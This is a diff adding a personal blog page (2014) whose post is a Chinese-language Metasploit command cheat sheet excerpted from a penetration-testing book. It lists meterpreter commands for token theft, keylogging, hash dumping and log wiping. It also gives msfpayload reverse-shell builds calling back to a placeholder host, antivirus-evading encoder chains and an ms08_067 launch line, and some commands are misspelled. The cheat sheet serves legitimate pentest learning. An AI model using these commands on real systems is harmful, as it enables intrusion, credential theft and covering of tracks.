@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<title>metasploit命令参考 - Hi~Roy!</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		<meta property="og:title" content="metasploit命令参考" />
+<meta property="og:description" content="节选自《metasploit渗透测试指南》
+show exploits 列出所有渗透攻击模块show payloads 列出所有攻击载荷show auxiliary 列出所有辅助模块search name 搜索info 列出详细信息use name 使用show options 查看参数show targets 查看某模块支持的目标平台show advanced 查看高级选项set autorunscript migrate -f 攻击完成后自动迁移到另一个进程check 检测目标是否对选定的渗透攻击存在相应的漏洞exploit 执行渗透攻击exploit -j 后台执行exploit -z 成功渗透后不与会话交互exploit -e encoder 指定攻击载荷编码方式exploit -h 帮助sessions -l 列出多个会话sessions -l -v 列出会话同时列出详细信息sessions -s scritp 在所有活跃会话中执行特定meterpreter脚本sessions -K 杀死所有活跃会话sessions -c cmd 在所有活跃会话上执行某命定sessions -u sessionID 升级一个普通的win shell 到 meterpreter shelldb_conreate name 创建数据库db_connect name 链接数据库db_namp 把namp的扫描结果存入数据库 hosts services查看结果db_autopwn -hdb_autopwn -p -r-e 对发现的所有端口执行db_autopwndb_destroy 删除当前数据库db_destory user:pswd@host:port/dbnamedb_status 查看 meterpreter命令" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/metasploit%E5%91%BD%E4%BB%A4%E5%8F%82%E8%80%83/" />
+<meta property="article:published_time" content="2014-10-24T17:18:46+00:00" />
+<meta property="article:modified_time" content="2014-10-24T17:18:46+00:00" />
+
+		<meta itemprop="name" content="metasploit命令参考">
+<meta itemprop="description" content="节选自《metasploit渗透测试指南》
+show exploits 列出所有渗透攻击模块show payloads 列出所有攻击载荷show auxiliary 列出所有辅助模块search name 搜索info 列出详细信息use name 使用show options 查看参数show targets 查看某模块支持的目标平台show advanced 查看高级选项set autorunscript migrate -f 攻击完成后自动迁移到另一个进程check 检测目标是否对选定的渗透攻击存在相应的漏洞exploit 执行渗透攻击exploit -j 后台执行exploit -z 成功渗透后不与会话交互exploit -e encoder 指定攻击载荷编码方式exploit -h 帮助sessions -l 列出多个会话sessions -l -v 列出会话同时列出详细信息sessions -s scritp 在所有活跃会话中执行特定meterpreter脚本sessions -K 杀死所有活跃会话sessions -c cmd 在所有活跃会话上执行某命定sessions -u sessionID 升级一个普通的win shell 到 meterpreter shelldb_conreate name 创建数据库db_connect name 链接数据库db_namp 把namp的扫描结果存入数据库 hosts services查看结果db_autopwn -hdb_autopwn -p -r-e 对发现的所有端口执行db_autopwndb_destroy 删除当前数据库db_destory user:pswd@host:port/dbnamedb_status 查看 meterpreter命令">
+<meta itemprop="datePublished" content="2014-10-24T17:18:46&#43;00:00" />
+<meta itemprop="dateModified" content="2014-10-24T17:18:46&#43;00:00" />
+<meta itemprop="wordCount" content="317">
+
+
+
+<meta itemprop="keywords" content="" />
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	<link rel="stylesheet" href="/css/roy.css">
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-81207387-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo logo--mixed">
+		<a class="logo__link" href="/" title="Roy&#39;s Blog" rel="home">
+			<div class="logo__item logo__imagebox">
+					<img class="logo__img" src="/images/logo.png">
+				</div><div class="logo__item logo__text">
+					<div class="logo__title">Roy&#39;s Blog</div>
+					<div class="logo__tagline">From the moment I first saw you, All the darkness turned to light.</div>
+				</div>
+		</a>
+	</div>
+		
+<nav class="menu">
+	<button class="menu__btn" aria-haspopup="true" aria-expanded="false" tabindex="0">
+		<span class="menu__btn-title" tabindex="-1">Menu</span>
+	</button>
+	<ul class="menu__list">
+		<li class="menu__item">
+			<a class="menu__link" href="/">
+				
+				<span class="menu__text">Home</span>
+				
+			</a>
+		</li>
+	</ul>
+</nav>
+
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">metasploit命令参考</h1>
+			<div class="post__meta meta"><div class="meta__item-author meta__item">
+	<svg class="meta__icon icon icon-author" width="16" height="16" viewBox="0 0 12 16"><path d="M6 1c2.2 0 3.5 2 3.5 4.5C9.5 7 8.9 8.2 8 9c2.9.8 4 2.5 4 5v1H0v-1c0-2.5 1.1-4.2 4-5-.9-.8-1.5-2-1.5-3.5C2.5 3 3.8 1 6 1z"/></svg><span class="meta__text">Roy</span>
+</div>
+<div class="meta__item-datetime meta__item">
+	<svg class="meta__icon icon icon-time" width="16" height="14" viewBox="0 0 30 28"><path d="M15 0C7 0 1 6 1 14s6 14 14 14 14-6 14-14S23 0 15 0zm0 25C9 25 4 20 4 14S9 3 15 3s11 5 11 11-5 11-11 11zm1-18h-2v8.4l6.8 4.4L22 18l-6-3.8V7z"/></svg><time class="meta__text" datetime="2014-10-24T17:18:46Z">2014-10-24</time></div></div>
+		</header><div class="content post__content clearfix">
+			<p>节选自《metasploit渗透测试指南》</p>
+<pre><code>show  exploits 列出所有渗透攻击模块
+show payloads 列出所有攻击载荷
+show auxiliary 列出所有辅助模块
+search name 搜索
+info 列出详细信息
+use name 使用
+show options 查看参数
+
+show targets 查看某模块支持的目标平台
+show advanced 查看高级选项
+
+set autorunscript migrate -f 攻击完成后自动迁移到另一个进程
+check 检测目标是否对选定的渗透攻击存在相应的漏洞
+exploit 执行渗透攻击
+exploit -j 后台执行
+exploit -z 成功渗透后不与会话交互
+exploit -e encoder 指定攻击载荷编码方式
+exploit -h 帮助
+
+sessions -l 列出多个会话
+sessions -l -v 列出会话同时列出详细信息
+sessions -s scritp 在所有活跃会话中执行特定meterpreter脚本
+sessions -K 杀死所有活跃会话
+sessions -c cmd 在所有活跃会话上执行某命定
+sessions -u sessionID 升级一个普通的win shell 到 meterpreter shell
+
+db_conreate name 创建数据库
+db_connect name 链接数据库
+db_namp 把namp的扫描结果存入数据库  hosts services查看结果
+db_autopwn -h
+db_autopwn -p -r-e 对发现的所有端口执行db_autopwn
+db_destroy 删除当前数据库
+db_destory user:pswd@host:port/dbname
+db_status 查看
+</code></pre><hr>
+<p>meterpreter命令</p>
+<pre><code>help 帮助
+run scriptname 运行meterpreter脚本， 在scripts/meterpreter目录
+sysinfo列出受控住记系统信息
+ls 列目录
+use priv 扩展meterpreter库
+ps 列进程
+migrate PID 迁移
+use incognito 加载incognito功能来盗取用户令牌
+list_tokens -u 列出目标主机用户可用令牌
+list_tokens -g 同上，列出用户组的
+impersonate_token DOMAIN_NAME\\USERNAME
+steal_token PID 到去给定进程的可用令牌进行假冒
+drop_token 停止假冒令牌
+getsystem 提权
+shell 利用可用令牌运行shell
+execute -f cmd.exe -i 执行cmd
+execute -f cmd.exe -i -t  用可用令牌执行cmd
+
+execute -f cmd.exe -i -H -t 用所有可用令牌执行cmd并隐藏该进程
+rev2self 回到初始用户
+reg commend 操作注册表
+setdesktop number 切换用户界面
+screenshot 屏幕截图
+upload/download file 上传下载文件
+keyscan_start/dump/stop  键盘记录
+getprivs 提权？？
+uictl enable keyboart/mouse  操纵目标的键盘鼠标
+background 将当前的seterpreter shell 转为后台执行
+hashdump 导出目标主机口令hash值
+use sniffer 加载嗅探模块
+sniffer_interfaces 列出开放大端口
+sniffer_dump interfaceID pcapname 启动嗅探
+sniffer_start interfaceID packer-buffer 数据包缓冲区嗅探
+sniffer_stats interfaceID 嗅探的统计数据
+sniffer_stop interfaceID 停止嗅探
+clearv 清除日志
+timestomp 修改文件属性 反取证调查
+reboot 重起
+
+</code></pre><hr>
+<p>msfpayload命令</p>
+<pre><code>msfpayload -h 帮助
+msfpayload windows/meterpreter/bind_tcp O 列出可用的攻击载荷
+msfpayload windows/meterpreter/bind_tcp O. 列出可用的攻击载荷配置项
+msfpayload windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xx X &gt; payload.exe 生成exe
+
+msfpayload windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xx R &gt; payload.raw 生成raw原始文件，在msfencode中使用
+msfpayload windows/meterpreter/bind_tcp LPORT=xx C &gt; payload.c 生成c格式的shell code
+msfpayload windows/meterpreter/bind_tcp LPORT=xx J &gt; payload.java 生成javascript字符串
+</code></pre><hr>
+<p>msfencode 命令</p>
+<pre><code>-h 帮助
+-l 列出可用的编码器
+-k 隐藏（不一定每次都可用）
+msfencode -i raw文件 -o 输出文件名 -x 指定模板 -e 编码器 -c 次数 -t 生成什么格式
+msfpayload windows/meterpreter/bind_tcp LPORT=xx R|msfencode -e x86/_countdown -c 5 -t raw| msfencode -e x86/shikata_ga_nai -c 5 -t exe -o mulit_encode.exe
+多次编码示例
+msfencode -i xx.raw BufferRedister=ESI -e x86/alpha_mixed -t c  创建一个纯数字字母的shellcode 由esi指向，c语言输出
+</code></pre><hr>
+<p>msfcli命令</p>
+<pre><code>msfcli|gerp exploit 列出攻击模块
+msfcli|grep exploit/windows 列出windows相关模块
+msfcli expliot/windows/smb/ms08_067_netapi PAYLOAD= windows/meterpreter/bind_tcp LPORT=443 RHOST=x.x.x.x E
+对目标发起netapi攻击 bind_tcp载荷 绑定443端口
+</code></pre>
+		</div>
+	</article>
+</main>
+
+<div class="authorbox clearfix">
+	<figure class="authorbox__avatar">
+		<img alt="Roy avatar" src="/images/my.jpg" class="avatar" height="90" width="90">
+	</figure>
+	<div class="authorbox__header">
+		<span class="authorbox__name">About Roy</span>
+	</div>
+	<div class="authorbox__description">
+		野生程序猿，略懂Python，略懂Golang，略懂云计算，略懂大数据，略懂拳击游泳钓鱼，略懂钢琴吉他摄影。
+	</div>
+</div>
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/centos%E5%AE%89%E8%A3%85denyhosts/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">centos安装denyhosts</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/python-selenium-phantomjs%E6%8A%93%E5%8F%96ajax%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">python&#43;selenium&#43;phantomjs抓取ajax动态页面</p>
+		</a>
+	</div>
+</nav>
+
+<section class="comments">
+	<div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "www-hi-roy-com" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+<div class="footer__links">
+	<a class="footer__link" href="/about/">About</a>
+</div>
+		<div class="footer__copyright">
+			&copy; 2024 Roy.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
